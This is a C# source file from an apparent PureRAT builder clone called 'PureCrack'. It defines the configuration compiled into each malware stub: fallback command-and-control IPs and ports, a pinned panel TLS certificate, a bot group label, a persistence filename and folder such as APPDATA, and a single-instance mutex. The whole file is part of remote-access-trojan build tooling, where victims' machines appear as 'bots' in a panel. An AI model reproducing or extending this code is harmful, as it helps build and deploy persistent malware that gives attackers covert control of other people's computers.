using System.Collections.Generic;

namespace PureCrack.Build;

/// <summary>
/// Per-build configuration that goes into the GClass3 protobuf message baked
/// into every stub. The relay populates this from the panel's /compile request
/// body; <see cref="StubBuilder.Build"/> is also callable directly with a
/// hand-crafted instance.
///
/// Field naming mirrors PureRAT's ProtoMember layout — see
/// <c>docs/WIRE_FORMAT.md</c> for the full schema. Boolean flags
/// <see cref="B0"/>/<see cref="B1"/>/<see cref="B2"/> retain their generic
/// names because the original IL doesn't tell us their semantics; the panel
/// always sends them and the stub always reads them.
/// </summary>
public sealed class BuildConfig
{
    /// <summary>F1 — IPs the stub will iterate, in order, until one connects.</summary>
    public List<string> Ips { get; init; } = new() { "127.0.0.1" };

    /// <summary>F2 — Ports tried per IP.</summary>
    public List<int> Ports { get; init; } = new() { 56001 };

    /// <summary>F3 — Base64 of the panel's TLS listener cert (DER or PFX).
    /// Stub pins against this in its RemoteCertificateValidationCallback.</summary>
    public string CertPfxBase64 { get; init; } = "";

    /// <summary>F4 — Bot group label shown in the panel's connections list.</summary>
    public string Group { get; init; } = "Default";

    /// <summary>F5 — Internal flag; semantics undocumented in original IL.</summary>
    public bool B0 { get; init; }

    /// <summary>F6 — Internal flag; semantics undocumented in original IL.</summary>
    public bool B1 { get; init; }

    /// <summary>F7 — Persistence filename (empty = no persistence).</summary>
    public string StartupName { get; init; } = "";

    /// <summary>F8 — Folder env var for persistence (e.g. <c>"APPDATA"</c>).</summary>
    public string StartupEnv { get; init; } = "";

    /// <summary>F9 — Single-instance mutex name.</summary>
    public string Mutex { get; init; } = "purecrack-default";

    /// <summary>F10 — Internal flag; semantics undocumented in original IL.</summary>
    public bool B2 { get; init; }
}
